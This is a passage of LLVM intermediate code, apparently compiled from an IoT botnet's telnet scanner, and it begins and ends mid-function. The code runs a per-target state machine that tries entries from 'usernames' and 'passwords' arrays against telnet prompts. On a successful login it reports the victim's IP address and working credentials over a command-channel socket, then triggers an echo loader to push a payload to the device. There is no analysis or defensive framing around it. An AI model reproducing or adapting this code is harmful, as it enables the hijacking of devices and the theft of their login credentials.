  %1634 = load i32, i32* %2, align 4
  %1635 = sext i32 %1634 to i64
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1635
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1636, i32 0, i32 8
  %1638 = load i8*, i8** %1637, align 8
  %1639 = call i8* @strstr(i8* %1638, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #11
  %1640 = icmp ne i8* %1639, null
  br i1 %1640, label %1641, label %1661

1641:                                             ; preds = %1625
  %1642 = load i32, i32* %2, align 4
  %1643 = sext i32 %1642 to i64
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1643
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1644, i32 0, i32 8
  %1646 = load i8*, i8** %1645, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1646, i8 0, i64 1024, i1 false)
  %1647 = load i32, i32* %2, align 4
  %1648 = sext i32 %1647 to i64
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1648
  %1650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1649, i32 0, i32 0
  %1651 = load i32, i32* %1650, align 16
  %1652 = call i32 @sclose(i32 %1651)
  %1653 = load i32, i32* %2, align 4
  %1654 = sext i32 %1653 to i64
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1654
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1655, i32 0, i32 2
  store i8 0, i8* %1656, align 8
  %1657 = load i32, i32* %2, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 3
  store i8 0, i8* %1660, align 1
  br label %2311

1661:                                             ; preds = %1625
  %1662 = load i32, i32* %2, align 4
  %1663 = sext i32 %1662 to i64
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1663
  %1665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1664, i32 0, i32 2
  store i8 7, i8* %1665, align 8
  br label %1666

1666:                                             ; preds = %1661
  %1667 = load i32, i32* %2, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1668
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1669, i32 0, i32 8
  %1671 = load i8*, i8** %1670, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1671, i8 0, i64 1024, i1 false)
  br label %2311

1672:                                             ; preds = %1606
  %1673 = load i32, i32* %2, align 4
  %1674 = sext i32 %1673 to i64
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1674
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1675, i32 0, i32 0
  %1677 = load i32, i32* %1676, align 16
  %1678 = load i32, i32* %2, align 4
  %1679 = sext i32 %1678 to i64
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1679
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1680, i32 0, i32 8
  %1682 = load i8*, i8** %1681, align 8
  %1683 = load i32, i32* %2, align 4
  %1684 = sext i32 %1683 to i64
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1684
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1685, i32 0, i32 7
  %1687 = load i16, i16* %1686, align 16
  %1688 = zext i16 %1687 to i32
  %1689 = call i32 @readUntil(i32 %1677, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1682, i32 1024, i32 %1688)
  %1690 = icmp ne i32 %1689, 0
  br i1 %1690, label %1691, label %1738

1691:                                             ; preds = %1672
  %1692 = load i32, i32* %2, align 4
  %1693 = sext i32 %1692 to i64
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1693
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1694, i32 0, i32 6
  store i32 0, i32* %1695, align 4
  %1696 = load i32, i32* %2, align 4
  %1697 = sext i32 %1696 to i64
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1697
  %1699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1698, i32 0, i32 7
  store i16 0, i16* %1699, align 16
  %1700 = load i32, i32* %2, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1701
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1702, i32 0, i32 8
  %1704 = load i8*, i8** %1703, align 8
  %1705 = call i8* @strstr(i8* %1704, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #11
  %1706 = icmp ne i8* %1705, null
  br i1 %1706, label %1707, label %1727

1707:                                             ; preds = %1691
  %1708 = load i32, i32* %2, align 4
  %1709 = sext i32 %1708 to i64
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1709
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1710, i32 0, i32 8
  %1712 = load i8*, i8** %1711, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1712, i8 0, i64 1024, i1 false)
  %1713 = load i32, i32* %2, align 4
  %1714 = sext i32 %1713 to i64
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 0
  %1717 = load i32, i32* %1716, align 16
  %1718 = call i32 @sclose(i32 %1717)
  %1719 = load i32, i32* %2, align 4
  %1720 = sext i32 %1719 to i64
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1720
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1721, i32 0, i32 2
  store i8 0, i8* %1722, align 8
  %1723 = load i32, i32* %2, align 4
  %1724 = sext i32 %1723 to i64
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1724
  %1726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1725, i32 0, i32 3
  store i8 0, i8* %1726, align 1
  br label %2311

1727:                                             ; preds = %1691
  %1728 = load i32, i32* %2, align 4
  %1729 = sext i32 %1728 to i64
  %1730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1729
  %1731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1730, i32 0, i32 2
  store i8 7, i8* %1731, align 8
  br label %1732

1732:                                             ; preds = %1727
  %1733 = load i32, i32* %2, align 4
  %1734 = sext i32 %1733 to i64
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1734
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1735, i32 0, i32 8
  %1737 = load i8*, i8** %1736, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1737, i8 0, i64 1024, i1 false)
  br label %2311

1738:                                             ; preds = %1672
  %1739 = load i32, i32* %2, align 4
  %1740 = sext i32 %1739 to i64
  %1741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1740
  %1742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1741, i32 0, i32 0
  %1743 = load i32, i32* %1742, align 16
  %1744 = load i32, i32* %2, align 4
  %1745 = sext i32 %1744 to i64
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1745
  %1747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1746, i32 0, i32 8
  %1748 = load i8*, i8** %1747, align 8
  %1749 = load i32, i32* %2, align 4
  %1750 = sext i32 %1749 to i64
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1750
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1751, i32 0, i32 7
  %1753 = load i16, i16* %1752, align 16
  %1754 = zext i16 %1753 to i32
  %1755 = call i32 @readUntil(i32 %1743, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1748, i32 1024, i32 %1754)
  %1756 = icmp ne i32 %1755, 0
  br i1 %1756, label %1757, label %1804

1757:                                             ; preds = %1738
  %1758 = load i32, i32* %2, align 4
  %1759 = sext i32 %1758 to i64
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1759
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1760, i32 0, i32 6
  store i32 0, i32* %1761, align 4
  %1762 = load i32, i32* %2, align 4
  %1763 = sext i32 %1762 to i64
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1763
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1764, i32 0, i32 7
  store i16 0, i16* %1765, align 16
  %1766 = load i32, i32* %2, align 4
  %1767 = sext i32 %1766 to i64
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1767
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1768, i32 0, i32 8
  %1770 = load i8*, i8** %1769, align 8
  %1771 = call i8* @strstr(i8* %1770, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #11
  %1772 = icmp ne i8* %1771, null
  br i1 %1772, label %1773, label %1793

1773:                                             ; preds = %1757
  %1774 = load i32, i32* %2, align 4
  %1775 = sext i32 %1774 to i64
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1775
  %1777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1776, i32 0, i32 8
  %1778 = load i8*, i8** %1777, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1778, i8 0, i64 1024, i1 false)
  %1779 = load i32, i32* %2, align 4
  %1780 = sext i32 %1779 to i64
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1780
  %1782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1781, i32 0, i32 0
  %1783 = load i32, i32* %1782, align 16
  %1784 = call i32 @sclose(i32 %1783)
  %1785 = load i32, i32* %2, align 4
  %1786 = sext i32 %1785 to i64
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1786
  %1788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1787, i32 0, i32 2
  store i8 0, i8* %1788, align 8
  %1789 = load i32, i32* %2, align 4
  %1790 = sext i32 %1789 to i64
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1790
  %1792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1791, i32 0, i32 3
  store i8 0, i8* %1792, align 1
  br label %2311

1793:                                             ; preds = %1757
  %1794 = load i32, i32* %2, align 4
  %1795 = sext i32 %1794 to i64
  %1796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1795
  %1797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1796, i32 0, i32 2
  store i8 7, i8* %1797, align 8
  br label %1798

1798:                                             ; preds = %1793
  %1799 = load i32, i32* %2, align 4
  %1800 = sext i32 %1799 to i64
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1800
  %1802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1801, i32 0, i32 8
  %1803 = load i8*, i8** %1802, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1803, i8 0, i64 1024, i1 false)
  br label %2311

1804:                                             ; preds = %1738
  %1805 = load i32, i32* %2, align 4
  %1806 = sext i32 %1805 to i64
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1806
  %1808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1807, i32 0, i32 0
  %1809 = load i32, i32* %1808, align 16
  %1810 = load i32, i32* %2, align 4
  %1811 = sext i32 %1810 to i64
  %1812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1811
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1812, i32 0, i32 8
  %1814 = load i8*, i8** %1813, align 8
  %1815 = load i32, i32* %2, align 4
  %1816 = sext i32 %1815 to i64
  %1817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1816
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1817, i32 0, i32 7
  %1819 = load i16, i16* %1818, align 16
  %1820 = zext i16 %1819 to i32
  %1821 = call i32 @readUntil(i32 %1809, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1814, i32 1024, i32 %1820)
  %1822 = icmp ne i32 %1821, 0
  br i1 %1822, label %1823, label %1870

1823:                                             ; preds = %1804
  %1824 = load i32, i32* %2, align 4
  %1825 = sext i32 %1824 to i64
  %1826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1825
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1826, i32 0, i32 6
  store i32 0, i32* %1827, align 4
  %1828 = load i32, i32* %2, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1829
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1830, i32 0, i32 7
  store i16 0, i16* %1831, align 16
  %1832 = load i32, i32* %2, align 4
  %1833 = sext i32 %1832 to i64
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1833
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1834, i32 0, i32 8
  %1836 = load i8*, i8** %1835, align 8
  %1837 = call i8* @strstr(i8* %1836, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #11
  %1838 = icmp ne i8* %1837, null
  br i1 %1838, label %1839, label %1859

1839:                                             ; preds = %1823
  %1840 = load i32, i32* %2, align 4
  %1841 = sext i32 %1840 to i64
  %1842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1841
  %1843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1842, i32 0, i32 8
  %1844 = load i8*, i8** %1843, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1844, i8 0, i64 1024, i1 false)
  %1845 = load i32, i32* %2, align 4
  %1846 = sext i32 %1845 to i64
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1846
  %1848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1847, i32 0, i32 0
  %1849 = load i32, i32* %1848, align 16
  %1850 = call i32 @sclose(i32 %1849)
  %1851 = load i32, i32* %2, align 4
  %1852 = sext i32 %1851 to i64
  %1853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1852
  %1854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1853, i32 0, i32 2
  store i8 0, i8* %1854, align 8
  %1855 = load i32, i32* %2, align 4
  %1856 = sext i32 %1855 to i64
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1856
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1857, i32 0, i32 3
  store i8 0, i8* %1858, align 1
  br label %2311

1859:                                             ; preds = %1823
  %1860 = load i32, i32* %2, align 4
  %1861 = sext i32 %1860 to i64
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1861
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1862, i32 0, i32 2
  store i8 7, i8* %1863, align 8
  br label %1864

1864:                                             ; preds = %1859
  %1865 = load i32, i32* %2, align 4
  %1866 = sext i32 %1865 to i64
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1866
  %1868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1867, i32 0, i32 8
  %1869 = load i8*, i8** %1868, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1869, i8 0, i64 1024, i1 false)
  br label %2311

1870:                                             ; preds = %1804
  %1871 = load i32, i32* %2, align 4
  %1872 = sext i32 %1871 to i64
  %1873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1872
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1873, i32 0, i32 8
  %1875 = load i8*, i8** %1874, align 8
  %1876 = call i64 @strlen(i8* %1875) #11
  %1877 = trunc i64 %1876 to i16
  %1878 = load i32, i32* %2, align 4
  %1879 = sext i32 %1878 to i64
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1879
  %1881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1880, i32 0, i32 7
  store i16 %1877, i16* %1881, align 16
  br label %1882

1882:                                             ; preds = %1870
  %1883 = load i32, i32* %2, align 4
  %1884 = sext i32 %1883 to i64
  %1885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1884
  %1886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1885, i32 0, i32 6
  %1887 = load i32, i32* %1886, align 4
  %1888 = add i32 %1887, 10
  %1889 = zext i32 %1888 to i64
  %1890 = call i64 @time(i64* null) #12
  %1891 = icmp slt i64 %1889, %1890
  br i1 %1891, label %1892, label %1907

1892:                                             ; preds = %1882
  %1893 = load i32, i32* %2, align 4
  %1894 = sext i32 %1893 to i64
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1894
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1895, i32 0, i32 0
  %1897 = load i32, i32* %1896, align 16
  %1898 = call i32 @sclose(i32 %1897)
  %1899 = load i32, i32* %2, align 4
  %1900 = sext i32 %1899 to i64
  %1901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1900
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1901, i32 0, i32 2
  store i8 0, i8* %1902, align 8
  %1903 = load i32, i32* %2, align 4
  %1904 = sext i32 %1903 to i64
  %1905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1904
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1905, i32 0, i32 3
  store i8 1, i8* %1906, align 1
  br label %1907

1907:                                             ; preds = %1892, %1882
  br label %2310

1908:                                             ; preds = %70
  %1909 = load i32, i32* %2, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1910
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1911, i32 0, i32 0
  %1913 = load i32, i32* %1912, align 16
  %1914 = call i64 @send(i32 %1913, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0), i64 4, i32 16384)
  %1915 = icmp slt i64 %1914, 0
  br i1 %1915, label %1916, label %1931

1916:                                             ; preds = %1908
  %1917 = load i32, i32* %2, align 4
  %1918 = sext i32 %1917 to i64
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1918
  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1919, i32 0, i32 0
  %1921 = load i32, i32* %1920, align 16
  %1922 = call i32 @sclose(i32 %1921)
  %1923 = load i32, i32* %2, align 4
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1924
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1925, i32 0, i32 2
  store i8 0, i8* %1926, align 8
  %1927 = load i32, i32* %2, align 4
  %1928 = sext i32 %1927 to i64
  %1929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1928
  %1930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1929, i32 0, i32 3
  store i8 1, i8* %1930, align 1
  br label %2311

1931:                                             ; preds = %1908
  %1932 = load i32, i32* %2, align 4
  %1933 = sext i32 %1932 to i64
  %1934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1933
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1934, i32 0, i32 2
  store i8 8, i8* %1935, align 8
  br label %2310

1936:                                             ; preds = %70
  %1937 = load i32, i32* %2, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1938
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1939, i32 0, i32 0
  %1941 = load i32, i32* %1940, align 16
  %1942 = call i64 @send(i32 %1941, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i64 0, i64 0), i64 7, i32 16384)
  %1943 = icmp slt i64 %1942, 0
  br i1 %1943, label %1944, label %1959

1944:                                             ; preds = %1936
  %1945 = load i32, i32* %2, align 4
  %1946 = sext i32 %1945 to i64
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1946
  %1948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1947, i32 0, i32 0
  %1949 = load i32, i32* %1948, align 16
  %1950 = call i32 @sclose(i32 %1949)
  %1951 = load i32, i32* %2, align 4
  %1952 = sext i32 %1951 to i64
  %1953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1952
  %1954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1953, i32 0, i32 2
  store i8 0, i8* %1954, align 8
  %1955 = load i32, i32* %2, align 4
  %1956 = sext i32 %1955 to i64
  %1957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1956
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1957, i32 0, i32 3
  store i8 1, i8* %1958, align 1
  br label %2311

1959:                                             ; preds = %1936
  %1960 = load i32, i32* %2, align 4
  %1961 = sext i32 %1960 to i64
  %1962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1961
  %1963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1962, i32 0, i32 2
  store i8 9, i8* %1963, align 8
  br label %2310

1964:                                             ; preds = %70
  %1965 = load i32, i32* %2, align 4
  %1966 = sext i32 %1965 to i64
  %1967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1966
  %1968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1967, i32 0, i32 0
  %1969 = load i32, i32* %1968, align 16
  %1970 = call i64 @send(i32 %1969, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %1971 = icmp slt i64 %1970, 0
  br i1 %1971, label %1972, label %1987

1972:                                             ; preds = %1964
  %1973 = load i32, i32* %2, align 4
  %1974 = sext i32 %1973 to i64
  %1975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1974
  %1976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1975, i32 0, i32 0
  %1977 = load i32, i32* %1976, align 16
  %1978 = call i32 @sclose(i32 %1977)
  %1979 = load i32, i32* %2, align 4
  %1980 = sext i32 %1979 to i64
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1980
  %1982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1981, i32 0, i32 2
  store i8 0, i8* %1982, align 8
  %1983 = load i32, i32* %2, align 4
  %1984 = sext i32 %1983 to i64
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1984
  %1986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1985, i32 0, i32 3
  store i8 1, i8* %1986, align 1
  br label %2311

1987:                                             ; preds = %1964
  %1988 = load i32, i32* @mainCommSock, align 4
  %1989 = load i32, i32* %2, align 4
  %1990 = sext i32 %1989 to i64
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1990
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1991, i32 0, i32 1
  %1993 = bitcast i32* %1992 to %struct.in_addr*
  %1994 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1993, i32 0, i32 0
  %1995 = load i32, i32* %1994, align 4
  %1996 = call i8* @inet_ntoa(i32 %1995) #12
  %1997 = load i32, i32* %2, align 4
  %1998 = sext i32 %1997 to i64
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1998
  %2000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1999, i32 0, i32 4
  %2001 = load i8, i8* %2000, align 2
  %2002 = zext i8 %2001 to i64
  %2003 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2002
  %2004 = load i8*, i8** %2003, align 8
  %2005 = load i32, i32* %2, align 4
  %2006 = sext i32 %2005 to i64
  %2007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2006
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2007, i32 0, i32 5
  %2009 = load i8, i8* %2008, align 1
  %2010 = zext i8 %2009 to i64
  %2011 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2010
  %2012 = load i8*, i8** %2011, align 8
  %2013 = call i32 (i32, i8*, ...) @sockprintf(i32 %1988, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %1996, i8* %2004, i8* %2012)
  %2014 = load i32, i32* %2, align 4
  %2015 = sext i32 %2014 to i64
  %2016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2015
  %2017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2016, i32 0, i32 2
  store i8 10, i8* %2017, align 8
  br label %2310

2018:                                             ; preds = %70
  call void @echoLoader()
  %2019 = load i32, i32* %2, align 4
  %2020 = sext i32 %2019 to i64
  %2021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2020
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2021, i32 0, i32 0
  %2023 = load i32, i32* %2022, align 16
  %2024 = call i64 @send(i32 %2023, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.75, i64 0, i64 0), i64 61, i32 16384)
  %2025 = load i32, i32* %2, align 4
  %2026 = sext i32 %2025 to i64
  %2027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2026
  %2028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2027, i32 0, i32 2
  store i8 11, i8* %2028, align 8
  br label %2310

2029:                                             ; preds = %70
  %2030 = load i32, i32* %2, align 4
  %2031 = sext i32 %2030 to i64
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2031
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2032, i32 0, i32 0
  %2034 = load i32, i32* %2033, align 16
  %2035 = call i64 @send(i32 %2034, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i64 0, i64 0), i64 49, i32 16384)
  %2036 = icmp slt i64 %2035, 0
  br i1 %2036, label %2037, label %2052

2037:                                             ; preds = %2029
  %2038 = load i32, i32* %2, align 4
  %2039 = sext i32 %2038 to i64
  %2040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2039
  %2041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2040, i32 0, i32 0
  %2042 = load i32, i32* %2041, align 16
  %2043 = call i32 @sclose(i32 %2042)
  %2044 = load i32, i32* %2, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2045
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2046, i32 0, i32 2
  store i8 0, i8* %2047, align 8
  %2048 = load i32, i32* %2, align 4
  %2049 = sext i32 %2048 to i64
  %2050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2049
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2050, i32 0, i32 3
  store i8 1, i8* %2051, align 1
  br label %2311

2052:                                             ; preds = %2029
  %2053 = load i32, i32* %2, align 4
  %2054 = sext i32 %2053 to i64
  %2055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2054
  %2056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2055, i32 0, i32 2
  store i8 12, i8* %2056, align 8
  br label %2057

2057:                                             ; preds = %70, %2052
  %2058 = load i32, i32* %2, align 4
  %2059 = sext i32 %2058 to i64
  %2060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2059
  %2061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2060, i32 0, i32 6
  %2062 = load i32, i32* %2061, align 4
  %2063 = icmp eq i32 %2062, 0
  br i1 %2063, label %2064, label %2071

2064:                                             ; preds = %2057
  %2065 = call i64 @time(i64* null) #12
  %2066 = trunc i64 %2065 to i32
  %2067 = load i32, i32* %2, align 4
  %2068 = sext i32 %2067 to i64
  %2069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2068
